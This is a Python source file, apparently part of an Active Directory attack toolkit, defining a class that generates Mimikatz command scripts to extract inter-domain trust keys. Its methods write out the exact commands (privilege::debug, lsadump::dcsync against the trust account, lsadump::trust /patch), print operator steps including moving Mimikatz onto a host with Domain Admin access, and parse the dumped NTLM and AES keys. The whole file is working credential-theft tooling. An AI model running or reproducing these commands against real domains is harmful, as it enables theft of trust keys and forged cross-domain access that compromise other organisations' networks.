"""
Mimikatz Trust Key Extractor
Extract trust keys using Mimikatz DCSync
"""

import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from .base import BaseExtractor
from ..models import TrustKey, KeyType, ExtractionMethod
from ..utils import get_trust_account_name, parse_mimikatz_dcsync


class MimikatzExtractor(BaseExtractor):
    """
    Extract trust keys using Mimikatz DCSync

    Requirements:
    - Domain Admin on source domain
    - Mimikatz.exe available
    - Network access to DC
    """

    def __init__(self, output_dir: str = "trust_keys", verbose: bool = True):
        """
        Initialize Mimikatz extractor
        """
        super().__init__(output_dir, verbose)
        self.mimikatz_path = "mimikatz.exe"

    def is_available(self) -> bool:
        """Check if Mimikatz is available"""
        return shutil.which(self.mimikatz_path) is not None or Path(self.mimikatz_path).exists()

    def generate_commands(
            self,
            source_domain: str,
            target_domain: str,
            dc_ip: Optional[str] = None
    ) -> List[str]:
        """
        Generate Mimikatz DCSync commands for trust key extraction
        """
        trust_account = get_trust_account_name(target_domain)
        dc_target = dc_ip if dc_ip else source_domain

        commands = [
            "# Mimikatz Trust Key Extraction via DCSync",
            "# Requires Domain Admin privileges",
            "",
            "# Enable debug privileges",
            "privilege::debug",
            "",
            f"# DCSync the trust account: {trust_account}",
            f"lsadump::dcsync /domain:{source_domain} /dc:{dc_target} /user:{trust_account}",
            "",
            "# Look for these values in output:",
            "#   Hash NTLM: <32-char hex>  - This is the RC4 trust key",
            "#   aes256_hmac: <64-char hex> - AES256 key (preferred)",
            "#   aes128_hmac: <32-char hex> - AES128 key",
            "",
            "# Alternative: Dump all trust accounts",
            "lsadump::trust /patch",
        ]

        return commands

    def extract(
            self,
            source_domain: str,
            target_domain: str,
            username: str,
            password: str,
            dc_ip: Optional[str] = None
    ) -> List[TrustKey]:
        """
        Extract trust keys using Mimikatz

        Note: Due to the nature of Mimikatz, this generates commands
        for manual execution rather than auto-executing
        """
        self.log(f"Preparing Mimikatz extraction for {source_domain} -> {target_domain}")

        trust_account = get_trust_account_name(target_domain)
        self.log(f"Trust account: {trust_account}")

        # Generate and save commands
        commands = self.generate_commands(source_domain, target_domain, dc_ip)
        cmd_file = self.save_commands(commands, source_domain, target_domain)

        # Print manual instructions
        self._print_manual_instructions(
            source_domain, target_domain, trust_account, dc_ip, cmd_file
        )

        # Return empty - manual execution required
        return []

    def _print_manual_instructions(
            self,
            source_domain: str,
            target_domain: str,
            trust_account: str,
            dc_ip: Optional[str],
            cmd_file: Path
    ) -> None:
        """Print manual execution instructions"""
        print(f"\n" + "=" * 60)
        print("MIMIKATZ TRUST KEY EXTRACTION")
        print("=" * 60)

        print(f"\n[!] Manual execution required!")
        print(f"\n[*] Source domain: {source_domain}")
        print(f"[*] Target domain: {target_domain}")
        print(f"[*] Trust account: {trust_account}")

        print(f"\n[*] Prerequisites:")
        print(f"    1. Domain Admin on {source_domain}")
        print(f"    2. Mimikatz.exe")
        print(f"    3. Network access to DC: {dc_ip or source_domain}")

        print(f"\n[*] Steps:")
        print(f"    1. Transfer Mimikatz to system with DA access")
        print(f"    2. Run: mimikatz.exe")
        print(f"    3. Execute commands from: {cmd_file}")
        print(f"    4. Extract the NTLM hash and AES keys from output")

        print(f"\n[*] Key values to extract:")
        print(f"    - Hash NTLM: <32-char hex> (RC4 trust key)")
        print(f"    - aes256_hmac: <64-char hex> (AES256 key)")
        print(f"    - aes128_hmac: <32-char hex> (AES128 key)")

    def generate_trust_dump_commands(self, source_domain: str) -> List[str]:
        """
        Generate commands to dump ALL trust relationships
        """
        commands = [
            "# Mimikatz - Dump All Trust Keys",
            "",
            "privilege::debug",
            "",
            "# Method 1: lsadump::trust (requires patch)",
            "# This dumps all trust keys at once",
            "lsadump::trust /patch",
            "",
            "# Method 2: DCSync individual trust accounts",
            f"# List trust accounts first:",
            f"# Get-ADObject -Filter {{ObjectClass -eq 'trustedDomain'}} -Server {source_domain}",
            "",
            "# Then DCSync each TRUSTEDDOMAIN$ account",
        ]

        return commands

    def parse_output(self, mimikatz_output: str) -> Optional[TrustKey]:
        """
        Parse Mimikatz output to extract trust key

        Args:
            mimikatz_output: Raw Mimikatz DCSync output

        Returns:
            TrustKey object or None
        """
        parsed = parse_mimikatz_dcsync(mimikatz_output)

        if not parsed.get("ntlm"):
            return None

        # Determine source/target from account name
        account = parsed.get("account", "")
        target_domain = account.rstrip("$") if account else "unknown"

        key = TrustKey(
            account_name=account,
            source_domain="",  # Not in output
            target_domain=target_domain,
            key_type=KeyType.RC4_HMAC,
            key_value=parsed["ntlm"],
            aes256_key=parsed.get("aes256"),
            aes128_key=parsed.get("aes128"),
            extracted_at=datetime.now(),
            extraction_method=ExtractionMethod.MIMIKATZ_DCSYNC,
        )

        return key